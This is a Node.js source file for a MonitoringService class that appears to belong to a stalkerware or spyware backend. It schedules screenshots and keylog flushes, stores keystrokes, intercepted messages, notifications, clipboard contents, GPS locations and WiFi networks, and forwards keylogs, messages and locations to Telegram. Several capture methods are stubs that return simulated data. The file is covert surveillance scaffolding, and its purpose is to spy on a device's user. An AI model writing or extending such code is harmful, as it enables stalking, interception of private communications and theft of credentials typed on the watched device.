const cron = require('node-cron');
const si = require('systeminformation');
const Logger = require('../utils/Logger');

class MonitoringService {
    constructor(database, notificationService) {
        this.database = database;
        this.notificationService = notificationService;
        this.logger = new Logger();
        this.cronJobs = [];
        this.keylogBuffer = [];
        this.isRunning = false;
    }
    
    async start() {
        if (this.isRunning) return;
        
        this.logger.info('Starting monitoring service...');
        this.isRunning = true;
        
        // Setup monitoring tasks based on settings
        const settings = await this.database.getSettings();
        
        // Screenshot monitoring (every 5 minutes by default)
        if (settings.enableScreenshots) {
            const screenshotJob = cron.schedule('*/5 * * * *', async () => {
                await this.captureScreenshot();
            });
            this.cronJobs.push(screenshotJob);
        }
        
        // System monitoring (every minute)
        if (settings.enableSystemInfo) {
            const systemJob = cron.schedule('*/1 * * * *', async () => {
                await this.captureSystemInfo();
            });
            this.cronJobs.push(systemJob);
        }
        
        // Keylog buffer flush (every 30 seconds)
        if (settings.enableKeylogging) {
            const keylogJob = cron.schedule('*/30 * * * * *', async () => {
                await this.flushKeylogBuffer();
            });
            this.cronJobs.push(keylogJob);
        }
        
        // Cleanup old data (daily at 3 AM)
        const cleanupJob = cron.schedule('0 3 * * *', async () => {
            await this.database.cleanupOldData(30);
            this.logger.info('Cleaned up old data');
        });
        this.cronJobs.push(cleanupJob);
        
        this.logger.info('Monitoring service started');
    }
    
    async stop() {
        if (!this.isRunning) return;
        
        this.logger.info('Stopping monitoring service...');
        
        // Stop all cron jobs
        for (const job of this.cronJobs) {
            job.stop();
        }
        this.cronJobs = [];
        
        // Flush any remaining keylogs
        await this.flushKeylogBuffer();
        
        this.isRunning = false;
        this.logger.info('Monitoring service stopped');
    }
    
    async captureScreenshot() {
        try {
            // In a real implementation, this would capture actual screenshots
            // For the server environment, we'll simulate it
            const timestamp = new Date().toISOString();
            const filename = `screenshot_${Date.now()}.png`;
            const path = `./uploads/screenshots/${filename}`;
            
            // Log the screenshot capture
            await this.database.saveScreenshot(filename, path, 0);
            await this.database.logActivity('screenshot', {
                filename,
                timestamp
            });
            
            this.logger.debug('Screenshot captured');
            
        } catch (error) {
            this.logger.error('Failed to capture screenshot:', error);
        }
    }
    
    async captureSystemInfo() {
        try {
            const cpu = await si.currentLoad();
            const mem = await si.mem();
            const disk = await si.fsSize();
            const network = await si.networkInterfaces();
            const battery = await si.battery();
            
            const diskUsage = disk.reduce((acc, d) => {
                return acc + (d.use || 0);
            }, 0) / disk.length;
            
            const networkInfo = network
                .filter(n => !n.internal)
                .map(n => ({
                    iface: n.iface,
                    ip4: n.ip4,
                    mac: n.mac
                }));
            
            await this.database.saveSystemInfo(
                cpu.currentLoad,
                (mem.used / mem.total) * 100,
                diskUsage,
                networkInfo,
                battery.percent
            );
            
        } catch (error) {
            this.logger.error('Failed to capture system info:', error);
        }
    }
    
    async logKeystrokes(keys, window = null) {
        this.keylogBuffer.push({ keys, window, timestamp: new Date() });
        
        // Flush buffer if it reaches the limit
        const settings = await this.database.getSettings();
        if (this.keylogBuffer.length >= (settings.keylogBuffer || 100)) {
            await this.flushKeylogBuffer();
        }
    }
    
    async flushKeylogBuffer() {
        if (this.keylogBuffer.length === 0) return;
        
        try {
            for (const entry of this.keylogBuffer) {
                await this.database.saveKeylog(entry.keys, entry.window);
            }
            
            // Notify about keylogs if enabled
            if (this.notificationService) {
                await this.notificationService.notifyKeylogs(this.keylogBuffer);
            }
            
            this.logger.debug(`Flushed ${this.keylogBuffer.length} keylog entries`);
            this.keylogBuffer = [];
            
        } catch (error) {
            this.logger.error('Failed to flush keylog buffer:', error);
        }
    }
    
    async captureNotification(app, title, text) {
        try {
            await this.database.saveNotification(app, title, text);
            
            // Forward to Telegram if enabled
            if (this.notificationService) {
                await this.notificationService.forwardNotification(app, title, text);
            }
            
        } catch (error) {
            this.logger.error('Failed to capture notification:', error);
        }
    }
    
    async captureMessage(sender, recipient, content, type = 'text') {
        try {
            await this.database.saveMessage(sender, recipient, content, type);
            
            // Forward to Telegram if enabled
            if (this.notificationService) {
                await this.notificationService.forwardMessage(sender, recipient, content);
            }
            
        } catch (error) {
            this.logger.error('Failed to capture message:', error);
        }
    }
    
    async captureLocation(latitude, longitude, accuracy) {
        try {
            await this.database.saveLocation(latitude, longitude, accuracy);
            
            // Notify about location update
            if (this.notificationService) {
                await this.notificationService.notifyLocation(latitude, longitude);
            }
            
        } catch (error) {
            this.logger.error('Failed to capture location:', error);
        }
    }
    
    async captureClipboard(content, type = 'text') {
        try {
            await this.database.saveClipboard(content, type);
            
        } catch (error) {
            this.logger.error('Failed to capture clipboard:', error);
        }
    }
    
    async getLocation() {
        // In a real implementation, this would get actual GPS location
        // For the server, we'll return a simulated location
        const lastLocation = await this.database.getLastLocation();
        
        if (lastLocation) {
            return lastLocation;
        }
        
        // Return default location (example: New York)
        return {
            latitude: 40.7128,
            longitude: -74.0060,
            accuracy: 10,
            timestamp: Date.now()
        };
    }
    
    async takeScreenshot() {
        // In a real implementation, this would take an actual screenshot
        // For the server, we'll return null to indicate unavailable
        return null;
    }
    
    async recordAudio(duration = 10) {
        // In a real implementation, this would record actual audio
        // For the server, we'll simulate it
        return {
            filename: `audio_${Date.now()}.mp3`,
            duration,
            size: duration * 16000 // Approximate size
        };
    }
    
    async capturePhoto(camera = 'back') {
        // In a real implementation, this would capture an actual photo
        // For the server, we'll simulate it
        return {
            filename: `photo_${camera}_${Date.now()}.jpg`,
            camera,
            timestamp: Date.now()
        };
    }
    
    async getInstalledApps() {
        // In a real implementation, this would list actual installed apps
        // For the server, we'll return simulated data
        const apps = await this.database.getInstalledApps();
        
        if (apps.length === 0) {
            // Return some example apps
            const exampleApps = [
                { packageName: 'com.whatsapp', appName: 'WhatsApp', version: '2.23.1' },
                { packageName: 'com.instagram', appName: 'Instagram', version: '250.0' },
                { packageName: 'com.facebook', appName: 'Facebook', version: '400.0' },
                { packageName: 'com.telegram', appName: 'Telegram', version: '10.0' },
                { packageName: 'com.spotify', appName: 'Spotify', version: '8.8' }
            ];
            
            for (const app of exampleApps) {
                await this.database.saveApp(app.packageName, app.appName, app.version);
            }
            
            return exampleApps;
        }
        
        return apps;
    }
    
    async getWiFiNetworks() {
        try {
            const wifi = await si.wifiNetworks();
            
            for (const network of wifi) {
                await this.database.saveWiFiNetwork(
                    network.ssid,
                    network.bssid,
                    network.security,
                    network.signalLevel,
                    false
                );
            }
            
            return wifi;
            
        } catch (error) {
            this.logger.error('Failed to get WiFi networks:', error);
            return [];
        }
    }
    
    async getClipboardContent() {
        // In a real implementation, this would get actual clipboard content
        // For the server, we'll return the last saved clipboard entry
        const history = await this.database.getClipboardHistory(1);
        return history[0] || { content: 'No clipboard data available', type: 'text' };
    }
}

module.exports = MonitoringService;